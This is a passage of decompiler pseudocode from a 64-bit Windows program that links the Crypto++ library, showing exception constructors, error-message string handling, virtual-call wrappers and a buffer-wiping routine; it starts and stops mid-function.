    v26 = sub_13F107AD0(&v50, 0x17ui64, 0i64, (const __m128i *)"', trying to retrieve '", 0x17ui64);
  }
  else
  {
    v51.m128i_i64[0] += 23i64;
    v24 = &v50;
    if ( v23.m128i_i64[1] >= 0x10ui64 )
      v24 = (__m128i *)v50.m128i_i64[0];
    v25 = (__m128i *)((char *)v24 + v23.m128i_i64[0]);
    sub_13F15EB00(v25, (const __m128i *)"', trying to retrieve '", 0x17ui64);
    v25[1].m128i_i8[7] = 0;
    v26 = &v50;
  }
  v53 = 0i64;
  v52 = *v26;
  v53 = v26[1];
  v26[1].m128i_i64[0] = 0i64;
  v26[1].m128i_i64[1] = 15i64;
  v26->m128i_i8[0] = 0;
  v27 = (const __m128i *)sub_13F15E554(a4 + 8, (__int64)qword_13F1C5720);
  do
    ++v20;
  while ( v27->m128i_i8[v20] );
  v28 = sub_13F106DB0(&v52, v27, v20);
  v49 = 0i64;
  v48 = *v28;
  v49 = v28[1];
  v28[1].m128i_i64[0] = 0i64;
  v28[1].m128i_i64[1] = 15i64;
  v28->m128i_i8[0] = 0;
  v29 = v49;
  if ( v49.m128i_i64[1] == v49.m128i_i64[0] )
  {
    v32 = sub_13F107AD0(&v48, 1ui64, 0i64, (const __m128i *)&qword_13F19B5B0, 1ui64);
  }
  else
  {
    ++v49.m128i_i64[0];
    v30 = &v48;
    if ( v29.m128i_i64[1] >= 0x10ui64 )
      v30 = (__m128i *)v48.m128i_i64[0];
    v31 = (__m128i *)((char *)v30 + v29.m128i_i64[0]);
    sub_13F15EB00(v31, (const __m128i *)&qword_13F19B5B0, 1ui64);
    v31->m128i_i8[1] = 0;
    v32 = &v48;
  }
  v56 = *v32;
  v57 = v32[1];
  v32[1].m128i_i64[0] = 0i64;
  v32[1].m128i_i64[1] = 15i64;
  v32->m128i_i8[0] = 0;
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  *(_QWORD *)a1 = off_13F181CA8;
  *(_DWORD *)(a1 + 24) = 1;
  sub_13F1053F0((__m128i **)(a1 + 32), &v56);
  *(_QWORD *)a1 = off_13F181CC0;
  if ( v57.m128i_i64[1] >= 0x10ui64 )
  {
    v33 = v57.m128i_i64[1] + 1;
    v34 = v56.m128i_i64[0];
    if ( (unsigned __int64)(v57.m128i_i64[1] + 1) >= 0x1000 )
    {
      v33 = v57.m128i_i64[1] + 40;
      v34 = *(_QWORD *)(v56.m128i_i64[0] - 8);
      if ( (unsigned __int64)(v56.m128i_i64[0] - v34 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v34, v33);
  }
  if ( v49.m128i_i64[1] >= 0x10ui64 )
  {
    v35 = v49.m128i_i64[1] + 1;
    v36 = v48.m128i_i64[0];
    if ( (unsigned __int64)(v49.m128i_i64[1] + 1) >= 0x1000 )
    {
      v35 = v49.m128i_i64[1] + 40;
      v36 = *(_QWORD *)(v48.m128i_i64[0] - 8);
      if ( (unsigned __int64)(v48.m128i_i64[0] - v36 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v36, v35);
  }
  v49 = _mm_load_si128((const __m128i *)&xmmword_13F19CCC0);
  v48.m128i_i8[0] = 0;
  if ( v53.m128i_i64[1] >= 0x10ui64 )
  {
    v37 = v53.m128i_i64[1] + 1;
    v38 = v52.m128i_i64[0];
    if ( (unsigned __int64)(v53.m128i_i64[1] + 1) >= 0x1000 )
    {
      v37 = v53.m128i_i64[1] + 40;
      v38 = *(_QWORD *)(v52.m128i_i64[0] - 8);
      if ( (unsigned __int64)(v52.m128i_i64[0] - v38 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v38, v37);
  }
  v53 = _mm_load_si128((const __m128i *)&xmmword_13F19CCC0);
  v52.m128i_i8[0] = 0;
  if ( v51.m128i_i64[1] >= 0x10ui64 )
  {
    v39 = v51.m128i_i64[1] + 1;
    v40 = v50.m128i_i64[0];
    if ( (unsigned __int64)(v51.m128i_i64[1] + 1) >= 0x1000 )
    {
      v39 = v51.m128i_i64[1] + 40;
      v40 = *(_QWORD *)(v50.m128i_i64[0] - 8);
      if ( (unsigned __int64)(v50.m128i_i64[0] - v40 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v40, v39);
  }
  v51 = _mm_load_si128((const __m128i *)&xmmword_13F19CCC0);
  v50.m128i_i8[0] = 0;
  if ( v55.m128i_i64[1] >= 0x10ui64 )
  {
    v41 = v55.m128i_i64[1] + 1;
    v42 = v54.m128i_i64[0];
    if ( (unsigned __int64)(v55.m128i_i64[1] + 1) >= 0x1000 )
    {
      v41 = v55.m128i_i64[1] + 40;
      v42 = *(_QWORD *)(v54.m128i_i64[0] - 8);
      if ( (unsigned __int64)(v54.m128i_i64[0] - v42 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v42, v41);
  }
  v55 = _mm_load_si128((const __m128i *)&xmmword_13F19CCC0);
  v54.m128i_i8[0] = 0;
  if ( si128.m128i_i64[1] >= 0x10ui64 )
  {
    v43 = si128.m128i_i64[1] + 1;
    v44 = v46.m128i_i64[0];
    if ( (unsigned __int64)(si128.m128i_i64[1] + 1) >= 0x1000 )
    {
      v43 = si128.m128i_i64[1] + 40;
      v44 = *(_QWORD *)(v46.m128i_i64[0] - 8);
      if ( (unsigned __int64)(v46.m128i_i64[0] - v44 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v44, v43);
  }
  *(_QWORD *)a1 = off_13F183428;
  *(_QWORD *)(a1 + 64) = a3;
  *(_QWORD *)(a1 + 72) = a4;
  return a1;
}
// 13F1017A1: conditional instruction was optimized away because %var_108@8.8>=23u
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F181CA8: using guessed type __int64 (__fastcall *off_13F181CA8[3])();
// 13F181CC0: using guessed type __int64 (__fastcall *off_13F181CC0[3])();
// 13F183428: using guessed type __int64 (__fastcall *off_13F183428[2])();
// 13F19B5B0: using guessed type __int64 qword_13F19B5B0;
// 13F19CCC0: using guessed type __int128 xmmword_13F19CCC0;
// 13F1C5720: using guessed type __int64 qword_13F1C5720[2];

//----- (000000013F101D10) ----------------------------------------------------
__int64 __fastcall sub_13F101D10(const __m128i *a1, __int64 a2, __int64 a3)
{
  __int64 result; // rax
  __m128i v7[2]; // [rsp+28h] [rbp-90h] BYREF
  char pExceptionObject[104]; // [rsp+50h] [rbp-68h] BYREF

  result = sub_13F15E52C(a2 + 8, a3 + 8);
  if ( (_DWORD)result )
  {
    sub_13F1053B0(v7, a1);
    sub_13F101710((__int64)pExceptionObject, v7, a2, a3);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVValueTypeMismatch_NameValuePairs_CryptoPP__);
  }
  return result;
}
// 13F101D10: using guessed type __m128i var_90[2];

//----- (000000013F101D80) ----------------------------------------------------
_QWORD *__fastcall sub_13F101D80(_QWORD *a1, char a2)
{
  *a1 = &CryptoPP::NameValuePairs::`vftable';
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 8i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F182E30: using guessed type void *CryptoPP::NameValuePairs::`vftable';

//----- (000000013F101DB0) ----------------------------------------------------
_QWORD *__fastcall sub_13F101DB0(_QWORD *a1, char a2)
{
  sub_13F1014E0(a1);
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 80i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F101DF0) ----------------------------------------------------
__int64 __fastcall sub_13F101DF0(__int64 a1, const __m128i *a2)
{
  *(_QWORD *)a1 = &std::exception::`vftable';
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  sub_13F15E46C((__int64)&a2->m128i_i64[1], a1 + 8);
  *(_QWORD *)a1 = off_13F181CA8;
  *(_DWORD *)(a1 + 24) = a2[1].m128i_i32[2];
  sub_13F1053F0((__m128i **)(a1 + 32), a2 + 2);
  *(_QWORD *)a1 = off_13F183428;
  *(__m128i *)(a1 + 64) = a2[4];
  return a1;
}
// 13F181CA8: using guessed type __int64 (__fastcall *off_13F181CA8[3])();
// 13F183428: using guessed type __int64 (__fastcall *off_13F183428[2])();

//----- (000000013F101E80) ----------------------------------------------------
__int64 __fastcall sub_13F101E80(__int64 a1, const __m128i *a2)
{
  *(_QWORD *)a1 = &std::exception::`vftable';
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  sub_13F15E46C((__int64)&a2->m128i_i64[1], a1 + 8);
  *(_QWORD *)a1 = off_13F181CA8;
  *(_DWORD *)(a1 + 24) = a2[1].m128i_i32[2];
  sub_13F1053F0((__m128i **)(a1 + 32), a2 + 2);
  *(_QWORD *)a1 = off_13F181CC0;
  return a1;
}
// 13F181CA8: using guessed type __int64 (__fastcall *off_13F181CA8[3])();
// 13F181CC0: using guessed type __int64 (__fastcall *off_13F181CC0[3])();

//----- (000000013F101F00) ----------------------------------------------------
__int64 __fastcall sub_13F101F00(__int64 a1, const __m128i *a2)
{
  *(_QWORD *)a1 = &std::exception::`vftable';
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  sub_13F15E46C((__int64)&a2->m128i_i64[1], a1 + 8);
  *(_QWORD *)a1 = off_13F181CA8;
  *(_DWORD *)(a1 + 24) = a2[1].m128i_i32[2];
  sub_13F1053F0((__m128i **)(a1 + 32), a2 + 2);
  return a1;
}
// 13F181CA8: using guessed type __int64 (__fastcall *off_13F181CA8[3])();

//----- (000000013F101F70) ----------------------------------------------------
void __noreturn sub_13F101F70()
{
  __m128i v0[2]; // [rsp+28h] [rbp-70h] BYREF
  char pExceptionObject[72]; // [rsp+50h] [rbp-48h] BYREF

  sub_13F1053B0(v0, (const __m128i *)"Clone() is not implemented yet.");
  sub_13F101660((__int64)pExceptionObject, v0);
  CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVNotImplemented_CryptoPP__);
}
// 13F101F70: using guessed type __m128i var_70[2];

//----- (000000013F101FC0) ----------------------------------------------------
__int64 __fastcall sub_13F101FC0(__int64 a1, const __m128i *a2)
{
  *(_QWORD *)a1 = &std::exception::`vftable';
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  sub_13F15E46C((__int64)&a2->m128i_i64[1], a1 + 8);
  *(_QWORD *)a1 = off_13F181CA8;
  *(_DWORD *)(a1 + 24) = a2[1].m128i_i32[2];
  sub_13F1053F0((__m128i **)(a1 + 32), a2 + 2);
  *(_QWORD *)a1 = off_13F181CD8;
  return a1;
}
// 13F181CA8: using guessed type __int64 (__fastcall *off_13F181CA8[3])();
// 13F181CD8: using guessed type __int64 (__fastcall *off_13F181CD8[3])();

//----- (000000013F102040) ----------------------------------------------------
__m128i *__fastcall sub_13F102040(__int64 a1, __m128i *a2)
{
  a2[1].m128i_i64[0] = 0i64;
  a2[1].m128i_i64[1] = 15i64;
  a2->m128i_i8[0] = 0;
  sub_13F106C50(a2, (const __m128i *)"unknown", 7ui64);
  return a2;
}

//----- (000000013F102080) ----------------------------------------------------
__m128i *__fastcall sub_13F102080(__int64 a1, __m128i *a2)
{
  a2[1].m128i_i64[0] = 0i64;
  a2[1].m128i_i64[1] = 15i64;
  a2->m128i_i8[0] = 0;
  sub_13F106C50(a2, (const __m128i *)"C++", 3ui64);
  return a2;
}

//----- (000000013F1020C0) ----------------------------------------------------
bool __fastcall sub_13F1020C0(__int64 a1, unsigned __int64 a2)
{
  __int64 (*v2)(void); // r8

  v2 = *(__int64 (**)(void))(*(_QWORD *)a1 + 32i64);
  if ( (char *)v2 != (char *)sub_13F1043D0 )
    return a2 == v2();
  if ( a2 <= 0x10 )
    return a2 == 16;
  if ( a2 < 0x20 )
    return a2 == a2 - (((_BYTE)a2 - 1) & 7) + 7;
  return a2 == 32;
}

//----- (000000013F102140) ----------------------------------------------------
__int64 __fastcall sub_13F102140(__int64 a1)
{
  __int64 (*v1)(void); // rdx

  v1 = *(__int64 (**)(void))(*(_QWORD *)a1 + 64i64);
  if ( v1 == sub_13F1024C0 )
    return 0i64;
  else
    return v1();
}

//----- (000000013F102170) ----------------------------------------------------
void __fastcall __noreturn sub_13F102170(__int64 a1)
{
  __int64 v1; // rax
  __m128i *v2; // rax
  __m128i *v3; // rax
  char v4[32]; // [rsp+28h] [rbp-90h] BYREF
  __m128i v5[2]; // [rsp+48h] [rbp-70h] BYREF
  char pExceptionObject[72]; // [rsp+70h] [rbp-48h] BYREF

  v1 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 104i64))(a1);
  v2 = (__m128i *)(*(__int64 (__fastcall **)(__int64, char *))(*(_QWORD *)v1 + 16i64))(v1, v4);
  v3 = sub_13F107420(v5, v2, (const __m128i *)": this object doesn't support resynchronization");
  sub_13F101660((__int64)pExceptionObject, v3);
  CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVNotImplemented_CryptoPP__);
}
// 13F102170: using guessed type char var_90[32];
// 13F102170: using guessed type __m128i var_70[2];

//----- (000000013F1021D0) ----------------------------------------------------
char sub_13F1021D0()
{
  return 1;
}

//----- (000000013F1021E0) ----------------------------------------------------
__int64 sub_13F1021E0()
{
  return 1i64;
}

//----- (000000013F1021F0) ----------------------------------------------------
__int64 __fastcall sub_13F1021F0(__int64 *a1, __int64 a2)
{
  __int64 v2; // rax
  __int64 (__fastcall *v5)(); // r8
  unsigned int v6; // ecx

  v2 = *a1;
  v5 = *(__int64 (__fastcall **)())(*a1 + 64);
  if ( v5 == sub_13F104610 )
  {
    v6 = 20;
  }
  else
  {
    v6 = ((__int64 (__fastcall *)(__int64 *))v5)(a1);
    v2 = *a1;
  }
  return (*(__int64 (__fastcall **)(__int64 *, __int64, _QWORD))(v2 + 120))(a1, a2, v6);
}
// 13F104610: using guessed type __int64 __fastcall sub_13F104610();

//----- (000000013F102240) ----------------------------------------------------
__int64 __fastcall sub_13F102240(__int64 *a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v6; // rax
  __int64 (__fastcall *v7)(__int64 *, __int64); // r8
  __int64 (__fastcall *v8)(); // r8
  unsigned int v10; // ecx

  (*(void (__fastcall **)(__int64 *, __int64, __int64))(*a1 + 32))(a1, a3, a4);
  v6 = *a1;
  v7 = *(__int64 (__fastcall **)(__int64 *, __int64))(*a1 + 48);
  if ( v7 != sub_13F1021F0 )
    return v7(a1, a2);
  v8 = *(__int64 (__fastcall **)())(v6 + 64);
  if ( v8 == sub_13F104610 )
    return (*(__int64 (__fastcall **)(__int64 *, __int64, __int64))(v6 + 120))(a1, a2, 20i64);
  v10 = ((__int64 (__fastcall *)(__int64 *))v8)(a1);
  return (*(__int64 (__fastcall **)(__int64 *, __int64, _QWORD))(*a1 + 120))(a1, a2, v10);
}
// 13F104610: using guessed type __int64 __fastcall sub_13F104610();

//----- (000000013F1022E0) ----------------------------------------------------
__int64 __fastcall sub_13F1022E0(__int64 *a1, __int64 a2)
{
  __int64 v2; // rax
  __int64 (__fastcall *v5)(); // r8
  unsigned int v6; // ecx

  v2 = *a1;
  v5 = *(__int64 (__fastcall **)())(*a1 + 64);
  if ( v5 == sub_13F104610 )
  {
    v6 = 20;
  }
  else
  {
    v6 = ((__int64 (__fastcall *)(__int64 *))v5)(a1);
    v2 = *a1;
  }
  return (*(__int64 (__fastcall **)(__int64 *, __int64, _QWORD))(v2 + 136))(a1, a2, v6);
}
// 13F104610: using guessed type __int64 __fastcall sub_13F104610();

//----- (000000013F102330) ----------------------------------------------------
__int64 __fastcall sub_13F102330(__int64 *a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v6; // rax
  __int64 (__fastcall *v7)(__int64 *, __int64); // r8
  __int64 (__fastcall *v8)(); // r8
  unsigned int v10; // ecx

  (*(void (__fastcall **)(__int64 *, __int64, __int64))(*a1 + 32))(a1, a3, a4);
  v6 = *a1;
  v7 = *(__int64 (__fastcall **)(__int64 *, __int64))(*a1 + 104);
  if ( v7 != sub_13F1022E0 )
    return v7(a1, a2);
  v8 = *(__int64 (__fastcall **)())(v6 + 64);
  if ( v8 == sub_13F104610 )
    return (*(__int64 (__fastcall **)(__int64 *, __int64, __int64))(v6 + 136))(a1, a2, 20i64);
  v10 = ((__int64 (__fastcall *)(__int64 *))v8)(a1);
  return (*(__int64 (__fastcall **)(__int64 *, __int64, _QWORD))(*a1 + 136))(a1, a2, v10);
}
// 13F104610: using guessed type __int64 __fastcall sub_13F104610();

//----- (000000013F1023D0) ----------------------------------------------------
__int64 __fastcall sub_13F1023D0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5)
{
  (*(void (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)a1 + 32i64))(a1, a4, a5);
  return (*(__int64 (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)a1 + 120i64))(a1, a2, a3);
}

//----- (000000013F102420) ----------------------------------------------------
__int64 __fastcall sub_13F102420(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5)
{
  (*(void (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)a1 + 32i64))(a1, a4, a5);
  return (*(__int64 (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)a1 + 136i64))(a1, a2, a3);
}

//----- (000000013F102470) ----------------------------------------------------
__int64 __fastcall sub_13F102470(__int64 a1)
{
  return a1 + 8;
}

//----- (000000013F102480) ----------------------------------------------------
__int64 __fastcall sub_13F102480(__int64 a1, _QWORD *a2)
{
  *a2 = 0i64;
  return 0i64;
}

//----- (000000013F102490) ----------------------------------------------------
char sub_13F102490()
{
  return 0;
}

//----- (000000013F1024A0) ----------------------------------------------------
__int64 __fastcall sub_13F1024A0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, char a5)
{
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 48i64))(a1);
}

//----- (000000013F1024C0) ----------------------------------------------------
__int64 sub_13F1024C0()
{
  return 0i64;
}

//----- (000000013F1024D0) ----------------------------------------------------
__int64 __fastcall sub_13F1024D0(_BYTE *a1)
{
  __int64 (*v1)(void); // rdx

  v1 = *(__int64 (**)(void))(*(_QWORD *)a1 + 192i64);
  if ( (char *)v1 == (char *)sub_13F102A60 )
    return a1[32] == 0;
  else
    return v1();
}

//----- (000000013F102500) ----------------------------------------------------
__int64 __fastcall sub_13F102500(__int64 a1)
{
  __int64 (*v1)(void); // rdx

  v1 = *(__int64 (**)(void))(*(_QWORD *)a1 + 336i64);
  if ( v1 == sub_13F1024C0 )
    return 0i64;
  else
    return v1();
}

//----- (000000013F102530) ----------------------------------------------------
void __noreturn sub_13F102530()
{
  __m128i v0[2]; // [rsp+28h] [rbp-70h] BYREF
  char pExceptionObject[72]; // [rsp+50h] [rbp-48h] BYREF

  sub_13F1053B0(v0, (const __m128i *)"BufferedTransformation: this object is not attachable");
  sub_13F101660((__int64)pExceptionObject, v0);
  CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVNotImplemented_CryptoPP__);
}
// 13F102530: using guessed type __m128i var_70[2];

//----- (000000013F102580) ----------------------------------------------------
__int64 __fastcall sub_13F102580(__int64 a1, const __m128i *a2)
{
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  *(_QWORD *)a1 = off_13F181CA8;
  *(_DWORD *)(a1 + 24) = 4;
  sub_13F1053F0((__m128i **)(a1 + 32), a2);
  *(_QWORD *)a1 = &CryptoPP::CryptoMaterial::InvalidMaterial::`vftable';
  return a1;
}
// 13F181CA8: using guessed type __int64 (__fastcall *off_13F181CA8[3])();
// 13F186018: using guessed type void *CryptoPP::CryptoMaterial::InvalidMaterial::`vftable';

//----- (000000013F1025D0) ----------------------------------------------------
__int64 __fastcall sub_13F1025D0(__int64 a1)
{
  __int64 result; // rax
  __m128i v2[2]; // [rsp+28h] [rbp-70h] BYREF
  char pExceptionObject[72]; // [rsp+50h] [rbp-48h] BYREF

  result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 24i64))(a1);
  if ( !(_BYTE)result )
  {
    sub_13F1053B0(v2, (const __m128i *)"CryptoMaterial: this object contains invalid values");
    sub_13F102580((__int64)pExceptionObject, v2);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVInvalidMaterial_CryptoMaterial_CryptoPP__);
  }
  return result;
}
// 13F1025D0: using guessed type __m128i var_70[2];

//----- (000000013F102630) ----------------------------------------------------
void __noreturn sub_13F102630()
{
  __m128i v0[2]; // [rsp+28h] [rbp-70h] BYREF
  char pExceptionObject[72]; // [rsp+50h] [rbp-48h] BYREF

  sub_13F1053B0(v0, (const __m128i *)"CryptoMaterial: this object does not support precomputation");
  sub_13F101660((__int64)pExceptionObject, v0);
  CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVNotImplemented_CryptoPP__);
}
// 13F102630: using guessed type __m128i var_70[2];

//----- (000000013F102680) ----------------------------------------------------
__int64 __fastcall sub_13F102680(__int64 a1, const __m128i *a2)
{
  *(_QWORD *)a1 = &std::exception::`vftable';
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  sub_13F15E46C((__int64)&a2->m128i_i64[1], a1 + 8);
  *(_QWORD *)a1 = off_13F181CA8;
  *(_DWORD *)(a1 + 24) = a2[1].m128i_i32[2];
  sub_13F1053F0((__m128i **)(a1 + 32), a2 + 2);
  *(_QWORD *)a1 = &CryptoPP::CryptoMaterial::InvalidMaterial::`vftable';
  return a1;
}
// 13F181CA8: using guessed type __int64 (__fastcall *off_13F181CA8[3])();
// 13F186018: using guessed type void *CryptoPP::CryptoMaterial::InvalidMaterial::`vftable';

//----- (000000013F102700) ----------------------------------------------------
__int64 __fastcall sub_13F102700(__int64 a1, const __m128i *a2)
{
  *(_QWORD *)a1 = &std::exception::`vftable';
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  sub_13F15E46C((__int64)&a2->m128i_i64[1], a1 + 8);
  *(_QWORD *)a1 = off_13F181CA8;
  *(_DWORD *)(a1 + 24) = a2[1].m128i_i32[2];
  sub_13F1053F0((__m128i **)(a1 + 32), a2 + 2);
  *(_QWORD *)a1 = off_13F1833E0;
  return a1;
}
// 13F181CA8: using guessed type __int64 (__fastcall *off_13F181CA8[3])();
// 13F1833E0: using guessed type __int64 (__fastcall *off_13F1833E0[3])();

//----- (000000013F102780) ----------------------------------------------------
void __noreturn sub_13F102780()
{
  __m128i v0[2]; // [rsp+28h] [rbp-70h] BYREF
  char pExceptionObject[72]; // [rsp+50h] [rbp-48h] BYREF

  sub_13F1053B0(v0, (const __m128i *)"GeneratableCryptoMaterial: this object does not support key/parameter generation");
  sub_13F101660((__int64)pExceptionObject, v0);
  CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVNotImplemented_CryptoPP__);
}
// 13F102780: using guessed type __m128i var_70[2];

//----- (000000013F1027D0) ----------------------------------------------------
__int64 __fastcall sub_13F1027D0(__int64 a1)
{
  __int64 (*v1)(void); // rdx
  __int64 v2; // rax
  __int64 v3; // rcx
  __int64 (__fastcall *v4)(__int64); // rdx
  __int64 v6; // rax
  __int64 v7; // rdx

  v1 = *(__int64 (**)(void))(*(_QWORD *)a1 + 48i64);
  if ( (char *)v1 == (char *)sub_13F1041C0 )
  {
    v2 = *(_QWORD *)(a1 - 8);
    v3 = a1 - 8;
    v4 = *(__int64 (__fastcall **)(__int64))(v2 + 72);
    if ( v4 == sub_13F104200 )
    {
      return v3 + 40 + *(int *)(*(_QWORD *)(v3 + 40) + 4i64);
    }
    else
    {
      v6 = v4(v3);
      return v6 + 16 + *(int *)(*(_QWORD *)(v6 + 16) + 4i64);
    }
  }
  else
  {
    v7 = v1();
    return v7 + *(int *)(*(_QWORD *)v7 + 4i64);
  }
}

//----- (000000013F102850) ----------------------------------------------------
__int64 __fastcall sub_13F102850(__int64 a1)
{
  __int64 (*v1)(void); // rdx
  __int64 v2; // rax
  __int64 v3; // rcx
  __int64 (__fastcall *v4)(__int64); // rdx
  __int64 v6; // rax
  __int64 v7; // rdx

  v1 = *(__int64 (**)(void))(*(_QWORD *)a1 + 56i64);
  if ( (char *)v1 == (char *)sub_13F104180 )
  {
    v2 = *(_QWORD *)(a1 - 8);
    v3 = a1 - 8;
    v4 = *(__int64 (__fastcall **)(__int64))(v2 + 64);
    if ( v4 == sub_13F104200 )
    {
      return v3 + 40 + *(int *)(*(_QWORD *)(v3 + 40) + 4i64);
    }
    else
    {
      v6 = v4(v3);
      return v6 + 16 + *(int *)(*(_QWORD *)(v6 + 16) + 4i64);
    }
  }
  else
  {
    v7 = v1();
    return v7 + *(int *)(*(_QWORD *)v7 + 4i64);
  }
}

//----- (000000013F1028D0) ----------------------------------------------------
__int64 __fastcall sub_13F1028D0(__int64 a1)
{
  __int64 (*v1)(void); // rdx
  __int64 v2; // rax
  __int64 v3; // rcx
  __int64 (__fastcall *v4)(__int64); // rdx
  __int64 v6; // rax
  __int64 v7; // rax

  v1 = *(__int64 (**)(void))(*(_QWORD *)a1 + 48i64);
  if ( (char *)v1 == (char *)sub_13F104290 )
  {
    v2 = *(_QWORD *)(a1 - 8);
    v3 = a1 - 8;
    v4 = *(__int64 (__fastcall **)(__int64))(v2 + 72);
    if ( v4 == sub_13F104200 )
    {
      return *(int *)(*(_QWORD *)(v3 + 168) + 4i64) + v3 + 168;
    }
    else
    {
      v6 = v4(v3);
      return *(int *)(*(_QWORD *)(v6 + 144) + 4i64) + v6 + 144;
    }
  }
  else
  {
    v7 = v1();
    return *(int *)(*(_QWORD *)(v7 + 8) + 4i64) + v7 + 8;
  }
}

//----- (000000013F102960) ----------------------------------------------------
__int64 __fastcall sub_13F102960(__int64 a1)
{
  __int64 (*v1)(void); // rdx
  __int64 v2; // rax
  __int64 v3; // rcx
  __int64 (__fastcall *v4)(__int64); // rdx
  __int64 v6; // rax
  __int64 v7; // rax

  v1 = *(__int64 (**)(void))(*(_QWORD *)a1 + 56i64);
  if ( (char *)v1 == (char *)sub_13F104250 )
  {
    v2 = *(_QWORD *)(a1 - 8);
    v3 = a1 - 8;
    v4 = *(__int64 (__fastcall **)(__int64))(v2 + 64);
    if ( v4 == sub_13F104200 )
    {
      return *(int *)(*(_QWORD *)(v3 + 168) + 4i64) + v3 + 168;
    }
    else
    {
      v6 = v4(v3);
      return *(int *)(*(_QWORD *)(v6 + 144) + 4i64) + v6 + 144;
    }
  }
  else
  {
    v7 = v1();
    return *(int *)(*(_QWORD *)(v7 + 8) + 4i64) + v7 + 8;
  }
}

//----- (000000013F1029F0) ----------------------------------------------------
__int64 __fastcall sub_13F1029F0(__int64 a1)
{
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 16i64))(a1);
}

//----- (000000013F102A00) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F102A00(_QWORD *a1)
{
  __int64 v1; // rdx
  unsigned __int64 result; // rax
  __int64 v3; // r8
  void *v4; // rdx

  v1 = 3i64;
  result = a1[3];
  if ( a1[2] < result )
    v1 = 2i64;
  v3 = a1[v1];
  v4 = (void *)a1[4];
  if ( v4 )
  {
    memset(v4, 0, 8 * v3);
    return sub_13F12E4D0((__int64)v4);
  }
  return result;
}

//----- (000000013F102A50) ----------------------------------------------------
__int64 __fastcall sub_13F102A50(__int64 *a1)
{
  __int64 v1; // rax

  v1 = *a1;
  *((_BYTE *)a1 + 32) = 0;
  return (*(__int64 (**)(void))(v1 + 360))();
}

//----- (000000013F102A60) ----------------------------------------------------
_BOOL8 __fastcall sub_13F102A60(__int64 a1)
{
  return *(_BYTE *)(a1 + 32) == 0;
}

//----- (000000013F102A70) ----------------------------------------------------
__int64 __fastcall sub_13F102A70(__int64 a1, __int64 a2, _QWORD *a3)
{
  *a3 = 0i64;
  return 0i64;
}

//----- (000000013F102A80) ----------------------------------------------------
__int64 __fastcall sub_13F102A80(__int64 a1, const __m128i *a2)
{
  unsigned __int64 v4; // r8
  __m128i *v5; // rax
  __m128i v6; // kr00_16
  __m128i *v7; // rbx
  __m128i *v8; // rbx
  __m128i *v9; // rax
  __int64 v10; // rdx
  __int64 v11; // rcx
  __int64 v12; // rdx
  __int64 v13; // rcx
  __int64 v14; // rdx
  __int64 v15; // rcx
  __m128i v17; // [rsp+38h] [rbp-19h] BYREF
  __m128i v18; // [rsp+48h] [rbp-9h]
  __m128i v19; // [rsp+58h] [rbp+7h] BYREF
  __m128i si128; // [rsp+68h] [rbp+17h]
  __m128i v21; // [rsp+78h] [rbp+27h] BYREF
  __m128i v22; // [rsp+88h] [rbp+37h]
  __int64 v23; // [rsp+98h] [rbp+47h]
  __int64 v24; // [rsp+A0h] [rbp+4Fh]

  v23 = -2i64;
  v24 = a1;
  si128 = _mm_load_si128((const __m128i *)&xmmword_13F19CCC0);
  v19.m128i_i8[0] = 0;
  sub_13F106C50(&v19, (const __m128i *)"AlgorithmParametersBase: parameter \"", 0x24ui64);
  v4 = -1i64;
  do
    ++v4;
  while ( a2->m128i_i8[v4] );
  v5 = sub_13F106DB0(&v19, a2, v4);
  v18 = 0i64;
  v17 = *v5;
  v18 = v5[1];
  v5[1].m128i_i64[0] = 0i64;
  v5[1].m128i_i64[1] = 15i64;
  v5->m128i_i8[0] = 0;
  v6 = v18;
  if ( v18.m128i_i64[1] - v18.m128i_i64[0] < 0xAui64 )
  {
